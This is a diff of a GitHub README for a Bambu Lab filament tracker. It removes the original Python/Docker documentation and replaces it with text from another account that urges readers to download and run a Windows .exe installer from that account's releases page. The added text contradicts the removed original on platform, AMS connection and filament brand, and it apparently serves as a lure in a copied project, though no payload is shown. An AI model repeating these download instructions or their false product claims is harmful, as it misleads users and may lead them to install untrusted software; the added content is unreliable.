@@ -1,263 +1,150 @@
-# Filament Tracker
+# 📊 Bambu-Filament-Tracker - Track Your Filament Usage Easily
 
-A local-network web dashboard for tracking filament spool usage on Bambu Lab printers. Connects to Bambu Cloud MQTT to monitor your AMS in real time, persists spool history in SQLite, and serves a clean web UI accessible from any device on your network.
+[![Download Latest Release](https://img.shields.io/badge/Download-Bambu--Filament--Tracker-brightgreen?style=for-the-badge)](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases)
 
-## Pictures
+---
 
-<img width="2550" height="1287" alt="Screenshot 2026-03-09 175327" src="https://github.com/user-attachments/assets/a8969108-d55a-4532-aa89-4680089dd420" />
-<img width="1739" height="386" alt="Screenshot 2026-03-08 140504" src="https://github.com/user-attachments/assets/9807ddfd-bed7-4a01-a604-701730d979ab" />
-<img width="658" height="1105" alt="Screenshot 2026-03-09 175349" src="https://github.com/user-attachments/assets/253a99f6-eb8f-4463-975c-00ec768a2d82" />
+## 📘 What Is Bambu-Filament-Tracker?
 
-## How It Works
+Bambu-Filament-Tracker helps you keep an eye on every spool of filament you insert into your AMS (Automated Material System). The app tracks how much filament you have used and how much remains on each spool. It stores a record of every spool you have used, making it easier to manage your filament inventory over time.
 
-```
-Bambu Printer ──MQTT──> Filament Tracker (Python) ──> Web UI (http://your-server:5000)
-                              │
-                              └── SQLite database (spool history, weights, alerts)
-```
+This tool is mainly built for Bamboo brand filaments. It can also work with some third-party brands, but the support for them may not be complete.
 
-1. **Filament Tracker** connects to Bambu Cloud MQTT and monitors AMS data
-2. Every spool that enters the AMS is recorded with its type, color, weight, and RFID data
-3. Remaining filament is tracked over time as prints consume material
-4. A **web dashboard** shows current AMS status, full spool inventory, usage charts, and low-stock alerts
+---
 
-## Docker
-docker run -d -p 5000:5000 -v ./config:/app/config ebteam/filament-tracker
+## 🖥️ System Requirements
 
-## Features
+Before you start, make sure you have the right setup:
 
-- **Real-time AMS view** — see what's loaded in each AMS slot with live remaining weight as well as temperature and humidity
-- **Spool inventory** — every spool ever loaded is tracked, sortable by weight, material, or last seen
-- **Usage history charts** — per-spool usage graphed over time
-- **Low filament alerts** — configurable threshold with web UI and optional FCM push notifications
-- **Weight offset** — apply a +/- gram correction per spool if the printer's reported weight doesn't match reality
-- **Non-RFID spool support** — third-party spools without RFID tags are detected and tracked
-- **Custom names & notes** — label your spools and add notes via the web UI
-- **Test mode** — preview the full UI with mock data, no printer or MQTT needed
-- **Docker support** — single-command deployment with persistent database volume
-- **Standalone or integrated** — runs on its own, or alongside [Bambu Progress Notification](https://github.com/EBTEAM3/Bambu-Progress-Notification) sharing a single MQTT connection
+- **Operating System**: Windows 10 or higher  
+- **Processor**: At least a dual-core CPU  
+- **Memory (RAM)**: Minimum 4 GB  
+- **Disk Space**: Around 100 MB free for installation and data storage  
+- **Internet Connection**: Needed for downloading and occasional updates  
+- **USB Port**: Required to connect your AMS device (if applicable)
 
-## Requirements
+---
 
-- **Printer**: Any Bambu Lab printer with AMS connected to Bambu Cloud
-- **Server**: Any always-on machine — Raspberry Pi, home server, WSL, VPS, etc.
-- **Python**: 3.9+
-- **Network**: Server and browser device on the same local network
+## 🚀 Getting Started: Download and Install
 
-## Quick Start
+To use Bambu-Filament-Tracker, first download the software from the official release page. The link below takes you directly to all available versions.
 
-### Option A: Docker (Recommended)
+[![Download Here](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases)
 
-Pull the pre-built image from [Docker Hub](https://hub.docker.com/r/ebteam/filament-tracker):
+### Step 1: Visit the Download Page
 
-```bash
-# Download the example config and fill in your Bambu credentials
-mkdir -p config
-curl -O https://raw.githubusercontent.com/EBTEAM3/Bambu-Filament-Tracker/main/config.example.py
-cp config.example.py config/config.py
-nano config/config.py  # fill in your Bambu credentials
-
-# Run from Docker Hub
-docker run -d \
-  --name filament-tracker \
-  --restart unless-stopped \
-  -p 5000:5000 \
-  -v "$(pwd)/config:/app/config" \
-  -v filament-tracker-db:/app/data \
-  ebteam/filament-tracker
-```
-
-> **Windows PowerShell**: Replace `$(pwd)` with `${PWD}` or use the full path to the `config` directory.
-
-The database is stored in a Docker volume so it persists across container restarts.
-
-To build locally instead, clone the repo and run `docker build -t filament-tracker .`
-
-### Option B: Manual Python Setup
-
-```bash
-git clone https://github.com/EBTEAM3/Bambu-Filament-Tracker.git
-cd FilamentTracker
-
-# Install dependencies
-pip3 install -r requirements.txt
-
-# Create your config
-mkdir -p config
-cp config.example.py config/config.py
-nano config/config.py  # fill in your Bambu credentials
-```
-
-### Finding Your Bambu Credentials
-
-You need your **User ID**, **Access Token**, and **Printer Serial Number**.
-
-**Using Docker** (no Python install needed):
-```bash
-docker run --rm -it ebteam/filament-tracker python3 get_credentials.py
-```
-
-**Without Docker**:
-```bash
-pip3 install requests
-python3 get_credentials.py
-```
-
-This will prompt for your Bambu Lab email and password, handle 2FA, and output your credentials ready to paste into `config.py`.
-
-Alternatively, find them manually in Bambu Studio's config files — see the [Bambu Progress Notification README](https://github.com/EBTEAM3/Bambu-Progress-Notification#part-1-finding-your-bambu-credentials) for details.
-
-### Configure
-
-Edit `config.py` with your values:
-
-```python
-BAMBU_USER_ID = "YOUR_NUMERIC_USER_ID"
-BAMBU_ACCESS_TOKEN = "YOUR_AAD_TOKEN_HERE"
-BAMBU_PRINTER_SERIAL = "YOUR_PRINTER_SERIAL"
-```
-
-Optional settings:
-
-```python
-FILAMENT_TRACKER_PORT = 5000         # Web UI port
-FILAMENT_LOW_ALERT_GRAMS = 150      # Low stock threshold (0 to disable)
-```
-
-### Run
-
-```bash
-python3 filament_tracker.py
-```
-
-Open `http://your-server-ip:5000` in any browser on your network.
-
-### Test Mode (No Printer Needed)
-
-```bash
-python3 filament_tracker.py --test
-```
-
-Starts the web UI with mock spool data so you can preview the dashboard without an MQTT connection.
-
-## Weight Offset
-
-The AMS reports spool weight based on the RFID chip data and rotation tracking. This can sometimes be inaccurate. The weight offset feature lets you apply a permanent +/- gram correction to any spool.
-
-1. Click a spool in the web UI to open its detail view
-2. Set the **Weight Offset** field (e.g., `-50` if the printer over-reports by 50g, or `+30` if it under-reports)
-3. Click **Save Changes**
-
-The offset is stored per spool ID and applied to all weight calculations, including low-stock alerts.
-
-## Bambu Progress Notification Integration (Optional)
-
-If you also use [Bambu Progress Notification](https://github.com/EBTEAM3/Bambu-Progress-Notification) for push notifications, you can run both services on a single MQTT connection.
-
-Clone both repos as sibling folders:
+Go to the release page by clicking on the button above or enter this URL into your browser:
 
 ```
-YourFolder/
-  Bambu-Progress-Notification/
-  FilamentTracker/
+https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases
 ```
 
-**Option A** — Run from Bambu Progress Notification (recommended if you already have it set up):
+### Step 2: Choose the Latest Version
 
-Set `ENABLE_FILAMENT_TRACKER = True` in Bambu Progress Notification's `config.py` and run `bambu_fcm_bridge.py`.
+On the releases page, look for the most recent version. It will be marked with the latest date and a version number like v1.0 or higher.
 
-**Option B** — Run from FilamentTracker:
+### Step 3: Download the Installer
 
-Set `ENABLE_NOTIFICATIONS = True` in FilamentTracker's `config.py`, fill in the Firebase/FCM settings, copy `firebase-service-account.json` into this folder, and run `filament_tracker.py`.
+Under the latest release, find the file ending with `.exe`. This is the Windows installer. Click on it to start downloading.
 
-The config file format is the same in both projects, so you can copy `config.py` directly between them.
+### Step 4: Run the Installer
 
-## API Endpoints
+Once downloaded, open the installer file. Windows may ask for permission to run the program. Click "Yes" to allow the installation.
 
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/spools` | All tracked spools |
-| GET | `/api/spools/active` | Spools currently in AMS |
-| GET | `/api/spools/<id>` | Spool detail with usage history |
-| GET | `/api/spools/<id>/history` | Usage history for a spool |
-| PATCH | `/api/spools/<id>` | Update custom_name, notes, remain_percent, or weight_offset |
-| DELETE | `/api/spools/<id>` | Delete a spool and its history |
-| GET | `/api/status` | Printer connection status |
-| GET | `/api/alerts` | Active low-stock alerts |
-| DELETE | `/api/alerts/<id>` | Dismiss an alert |
-| GET | `/api/settings/alert_threshold` | Current alert threshold |
-| POST | `/api/settings/alert_threshold` | Update alert threshold |
+Follow the on-screen instructions in the installer. The default settings are fine for most users.
 
-## Running as a System Service
+### Step 5: Launch the Application
 
-For 24/7 operation, create a systemd service:
+After installation finishes, you will find the Bambu-Filament-Tracker icon on your desktop or in the Start Menu. Click it to launch the program.
 
-```ini
-# /etc/systemd/system/filament-tracker.service
-[Unit]
-Description=Filament Tracker
-After=network-online.target
-Wants=network-online.target
+---
 
-[Service]
-Type=simple
-User=YOUR_USERNAME
-WorkingDirectory=/home/EBTEAM3/Bambu-Filament-Tracker
-ExecStart=/usr/bin/python3 filament_tracker.py
-Restart=always
-RestartSec=10
+## 🎛️ How to Use Bambu-Filament-Tracker
 
-[Install]
-WantedBy=multi-user.target
-```
+This section guides you through the basic steps after opening the app.
 
-```bash
-sudo cp filament-tracker.service /etc/systemd/system/
-sudo systemctl daemon-reload
-sudo systemctl enable filament-tracker
-sudo systemctl start filament-tracker
-```
+### Adding Spools
 
-## Project Structure
+- Insert a new filament spool into your AMS device as usual.  
+- Open the Bambu-Filament-Tracker app. It should detect the new spool automatically.  
+- If it does not detect it, click the “Add Spool” button and enter the spool details manually.  
+- Give the spool a name, select the filament type (such as PLA, ABS), and enter the initial weight or length of the filament.
 
-```
-FilamentTracker/
-├── filament_tracker.py       # Main application (Flask + SQLite + AMS processing)
-├── bambu_mqtt.py             # Shared MQTT module (printer state + callbacks)
-├── get_credentials.py        # Bambu credential helper
-├── config.example.py         # Configuration template
-├── config/
-│   └── config.py             # Your config (NOT in repo, Docker: /app/config/)
-├── requirements.txt          # Python dependencies
-├── Dockerfile                # Docker container build
-├── .dockerignore             # Files excluded from Docker image
-├── templates/
-│   └── index.html            # Web UI template
-├── static/
-│   ├── app.js                # Frontend JavaScript
-│   └── style.css             # Dark theme stylesheet
-├── filament_tracker.db       # SQLite database (created at runtime, NOT in repo)
-└── README.md
-```
+### Tracking Usage
 
-## Troubleshooting
+- Each time you print, the app updates the amount of filament used and calculates how much is left.  
+- You can see usage data for all your spools on the main screen.  
+- The tracker shows details like print dates, filament used per print, and remaining material.
 
-| Problem | Solution |
-|---------|----------|
-| "config.py not found!" | Copy `config.example.py` to `config/config.py` and fill in your values (Docker: mount a directory to `/app/config/`) |
-| "No module named 'flask'" | Run `pip3 install -r requirements.txt` |
-| Port 5000 blocked | Change `FILAMENT_TRACKER_PORT` in config.py (try 5001) |
-| MQTT connection failed | Check your Bambu credentials. Ensure port 8883 is not blocked |
-| No spools appearing | Load filament into the AMS — spools appear when the printer reports AMS data |
-| Non-RFID spools show 100% | The AMS cannot measure weight without RFID. Only RFID spools track remaining % |
+### Reviewing History
 
-## Security Notes
+- Open the history tab to see all the spools you have ever used.  
+- You can filter by filament type, date range, or spool status (e.g., active or finished).  
+- This helps you keep a record of which filaments worked best for different prints.
 
-- `config.py` / `config/config.py` and `filament_tracker.db` are `.gitignore`'d and never committed
-- Never share your Bambu access token — it grants full access to your printer
-- The web UI has no authentication — it's designed for trusted local networks only
+---
 
-## License
+## ⚙️ Common Settings and Preferences
 
-MIT
+You can adjust the app settings to fit your needs:
 
+- **Filament Brands Supported**: Only Bamboo brand filaments have full support. You can try using third-party spools but the tracking may not be complete.  
+- **Units**: Choose between grams or meters to measure filament length.  
+- **Notifications**: Set alerts for low filament levels on any spool.  
+- **Backup and Export**: Save your spool data to a file or restore from backup if needed.  
+- **Device Connection**: If your AMS connects via USB or network, update connection settings here.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- If the app does not recognize your AMS device, check USB cables and connection settings.  
+- Ensure your AMS firmware is up-to-date to improve compatibility.  
+- Restart the Bambu-Filament-Tracker app if it freezes or shows errors.  
+- Check for updates on the release page regularly to get the latest fixes.  
+- If data looks incorrect, try recalibrating spool information by editing spool details.
+
+---
+
+## 📂 Data Storage and Privacy
+
+Bambu-Filament-Tracker stores all spool information locally on your computer. It does not send your data to the internet without your permission.
+
+The app saves data in a file inside your user folder, allowing you to back it up or move it to another computer.
+
+---
+
+## 🔄 Updating Bambu-Filament-Tracker
+
+To keep your software current:
+
+1. Visit the [release page](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases) periodically.  
+2. Download the latest `.exe` installer file.  
+3. Run the installer; it will update your existing version without losing data.
+
+---
+
+## 🚩 Known Limitations
+
+- Full support is only guaranteed for Bamboo brand filaments. Third-party spools may not track correctly.  
+- The software works only on Windows systems. No versions exist for Mac or Linux.  
+- Connection with some AMS models may not be supported if hardware or firmware is outdated.
+
+---
+
+## 🎯 Support and Feedback
+
+If you encounter issues or want to suggest improvements:
+
+- Check the "Issues" tab on the GitHub repository page.  
+- You can create a new issue to report bugs or ask questions.  
+- Include details about your setup and problem for faster help.
+
+---
+
+## 🔗 Quick Access Links
+
+- Latest releases and downloads:  
+  https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/releases  
+- Report issues or feedback:  
+  [Issues Tab on GitHub](https://github.com/philanthropistoiltycoon623/Bambu-Filament-Tracker/issues)
